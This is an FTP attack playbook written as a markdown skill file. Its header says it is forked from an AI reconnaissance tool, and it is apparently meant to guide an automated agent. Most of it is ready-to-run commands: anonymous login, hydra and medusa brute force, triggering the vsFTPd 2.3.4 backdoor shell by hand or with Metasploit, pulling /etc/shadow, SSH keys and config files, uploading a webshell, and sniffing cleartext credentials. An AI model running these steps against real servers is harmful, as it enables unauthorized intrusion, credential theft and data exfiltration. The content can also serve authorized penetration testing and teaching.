<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: ftp
description: FTP security testing — anonymous login, brute force, bounce attacks, FTPS misconfiguration, vsftpd backdoor CVE, and sensitive file extraction
---

# FTP Security Testing

FTP (File Transfer Protocol) — cleartext authentication, common anonymous access. Attack surface: anonymous login, credential brute force, vsftpd backdoor (CVE-2011-2523), misconfigured write access.

**Ports:** 21 (FTP control), 20 (FTP data), 990 (FTPS)

---

## Reconnaissance

    nmap -p 21 <target> -sV --open
    nmap -p 21 <target> --script ftp-anon,ftp-banner,ftp-syst,ftp-brute

    # Banner grab:
    nc <target> 21
    # 220 (vsFTPd 2.3.4) ← BACKDOOR! CVE-2011-2523

---

## Anonymous Login

    # Test anonymous:
    ftp <target>
    Name: anonymous
    Password: anonymous@domain.com   # or any email

    # Command line:
    ftp -n <target> << EOF
    quote USER anonymous
    quote PASS anonymous@
    ls -la
    get sensitive_file.txt
    bye
    EOF

    # curl:
    curl ftp://<target>/                          # List root
    curl ftp://<target>/ --user "anonymous:"      # Explicit anonymous
    curl ftp://<target>/etc/passwd --user "anonymous:"  # Try to read files

    # nmap script:
    nmap --script ftp-anon -p 21 <target>

---

## Interactive FTP Commands

    ftp <target>
    > ls -la              # List all files (including hidden)
    > pwd                 # Current directory
    > cd /etc             # Change directory
    > get passwd          # Download file
    > put shell.php       # Upload file (if write access)
    > mget *              # Download all files
    > binary              # Switch to binary mode for binary files
    > passive             # Toggle passive mode
    > bye                 # Exit

---

## Brute Force

    # hydra:
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
          -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
          ftp://<target> -t 4

    # medusa:
    medusa -h <target> -u admin -P /usr/share/wordlists/rockyou.txt -M ftp

    # nmap:
    nmap --script ftp-brute -p 21 <target>

---

## CVE-2011-2523 — vsFTPd 2.3.4 Backdoor

Smiley face ":)" in username triggers backdoor shell on port 6200:

    # Detect: banner shows "vsFTPd 2.3.4"
    nmap -p 21 -sV <target>
    # Manually trigger backdoor:
    ftp <target>
    User: backdoored:)
    Pass: anything
    # Then connect to port 6200:
    nc <target> 6200

    # Metasploit:
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS <target>
    run

---

## File Extraction (If Credentials Obtained)

    # Recursive download with wget:
    wget -r --no-passive ftp://user:password@<target>/

    # lftp (powerful FTP client):
    sudo apt-get install -y lftp
    lftp -u user,password ftp://<target>
    lftp> mirror --verbose /remote/dir /local/dir/   # Recursive download

    # Sensitive files to look for:
    get /etc/passwd
    get /etc/shadow
    get /home/<user>/.ssh/id_rsa
    get /var/www/html/config.php
    get /backup/*.sql

---

## FTP Write Access → Webshell

If FTP write access and FTP root = webroot:

    # Upload webshell:
    ftp <target>
    > put shell.php
    > ls -la shell.php
    # Access: http://<target>/shell.php?cmd=id

---

## FTPS / SFTP Notes

    # FTPS (FTP over TLS) — port 990 or explicit FTPS on 21:
    curl ftps://<target>/ --user "user:pass" -k  # -k ignores cert errors

    # Check TLS cert:
    openssl s_client -connect <target>:21 -starttls ftp

    # SFTP (SSH-based, completely different protocol):
    sftp user@<target>     # Uses SSH port 22, NOT FTP

---

## Pro Tips

1. Anonymous access is still common on older servers, IoT devices, and misconfigured cloud
2. vsFTPd 2.3.4 backdoor is instant RCE — always check banner
3. FTP credentials in cleartext: `wireshark` or `tshark -f 'port 21'` captures them on LAN
4. Write access to FTP root = webshell if web server serves the same directory
5. `wget -r` recursively downloads entire FTP site in one command
6. PASV mode required for NAT'd connections — try `passive` in ftp client if connection hangs

## Summary

FTP testing: `nmap --script ftp-anon` → try `anonymous:anonymous` → check banner for vsFTPd 2.3.4 (backdoor) → brute force with hydra → if access: `wget -r` for full recursive download → if write: upload webshell. Cleartext protocol — capture creds on LAN with tshark.
